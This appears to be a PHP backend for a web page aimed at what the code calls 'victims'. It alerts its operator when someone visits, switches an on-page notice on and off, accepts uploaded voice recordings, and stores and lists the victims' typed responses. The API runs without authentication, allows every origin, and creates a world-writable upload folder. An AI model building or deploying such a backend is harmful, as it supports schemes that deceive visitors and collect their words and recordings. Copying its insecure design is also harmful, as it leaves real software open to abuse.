<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

$messagesFile = __DIR__ . '/messages.json';

function getMessages() {
    global $messagesFile;
    if (!file_exists($messagesFile)) {
        return [];
    }
    $content = file_get_contents($messagesFile);
    return json_decode($content, true) ?: [];
}

function saveMessages($messages) {
    global $messagesFile;
    file_put_contents($messagesFile, json_encode($messages, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

$method = $_SERVER['REQUEST_METHOD'];
$messagesFile = __DIR__ . '/messages.json';
$statusFile = __DIR__ . '/status.json';

function getStatus() {
    global $statusFile;
    if (!file_exists($statusFile)) {
        return ['last_visit' => null, 'new_visitor' => false];
    }
    return json_decode(file_get_contents($statusFile), true) ?: ['last_visit' => null, 'new_visitor' => false];
}

function saveStatus($status) {
    global $statusFile;
    file_put_contents($statusFile, json_encode($status));
}

switch ($method) {
    case 'GET':
        $action = isset($_GET['action']) ? $_GET['action'] : 'messages';
        
        if ($action === 'status') {
            $status = getStatus();
            $file = __DIR__ . '/victim_responses.json';
            $resps = file_exists($file) ? json_decode(file_get_contents($file) ?: '[]', true) : [];
            $status['new_response'] = count($resps) > 0;
            
            echo json_encode(['success' => true, 'status' => $status]);
            // Reset new_visitor flag after reading
            if ($status['new_visitor']) {
                $status['new_visitor'] = false;
                saveStatus($status);
            }
            break;
        }

        if ($action === 'get_victim_responses') {
            $file = __DIR__ . '/victim_responses.json';
            $resps = file_exists($file) ? json_decode(file_get_contents($file) ?: '[]', true) : [];
            echo json_encode(['success' => true, 'responses' => $resps]);
            break;
        }

        if ($action === 'clear_responses') {
            file_put_contents(__DIR__ . '/victim_responses.json', '[]');
            echo json_encode(['success' => true]);
            break;
        }

        $messages = getMessages();
        $lastId = isset($_GET['after']) ? intval($_GET['after']) : 0;
        if ($lastId > 0) {
            $messages = array_values(array_filter($messages, function($msg) use ($lastId) {
                return $msg['id'] > $lastId;
            }));
        }
        echo json_encode(['success' => true, 'messages' => $messages]);
        break;

    case 'POST':
        $action = isset($_GET['action']) ? $_GET['action'] : 'message';

        if ($action === 'visit') {
            $status = getStatus();
            $status['last_visit'] = date('Y-m-d H:i:s');
            $status['new_visitor'] = true;
            saveStatus($status);
            echo json_encode(['success' => true]);
            break;
        }
        if ($action === 'toggle_notice') {
            $input = json_decode(file_get_contents('php://input'), true);
            $status = getStatus();
            $status['notice_active'] = isset($input['active']) ? (bool)$input['active'] : false;
            saveStatus($status);
            echo json_encode(['success' => true]);
            break;
        }

        if ($action === 'upload_voice') {
            $dir = __DIR__ . '/recordings';
            if (!file_exists($dir)) {
                @mkdir($dir, 0777, true);
                @file_put_contents($dir . '/.htaccess', 'Options -Indexes');
            }
            
            if (!isset($_FILES['audio'])) {
                echo json_encode(['success' => false, 'error' => 'No audio file']);
                break;
            }
            
            $filename = 'voice_' . time() . '.webm';
            $path = $dir . '/' . $filename;
            
            if (move_uploaded_file($_FILES['audio']['tmp_name'], $path)) {
                echo json_encode(['success' => true, 'filename' => 'recordings/' . $filename]);
            } else {
                echo json_encode(['success' => false, 'error' => 'Upload failed']);
            }
            break;
        }

        if ($action === 'save_victim_response') {
            $input = json_decode(file_get_contents('php://input'), true);
            if (!isset($input['text'])) break;
            
            $file = __DIR__ . '/victim_responses.json';
            $resps = file_exists($file) ? json_decode(file_get_contents($file) ?: '[]', true) : [];
            $resps[] = [
                'id' => time(),
                'text' => $input['text'],
                'time' => date('H:i:s')
            ];
            file_put_contents($file, json_encode($resps));
            echo json_encode(['success' => true]);
            break;
        }

        $input = json_decode(file_get_contents('php://input'), true);
        if (!$input || empty($input['text'])) {
            http_response_code(400);
            echo json_encode(['success' => false, 'error' => 'Üzenet szöveg szükséges']);
            break;
        }
        $messages = getMessages();
        $maxId = 0;
        foreach ($messages as $msg) {
            if ($msg['id'] > $maxId) $maxId = $msg['id'];
        }
        $newMessage = [
            'id' => $maxId + 1,
            'text' => $input['text'],
            'type' => isset($input['type']) ? $input['type'] : 'normal',
            'timestamp' => date('Y-m-d H:i:s')
        ];
        $messages[] = $newMessage;
        saveMessages($messages);
        echo json_encode(['success' => true, 'message' => $newMessage]);
        break;

    case 'DELETE':
        saveMessages([]);
        echo json_encode(['success' => true]);
        break;

    default:
        http_response_code(405);
        echo json_encode(['success' => false, 'error' => 'Method not allowed']);
}
?>
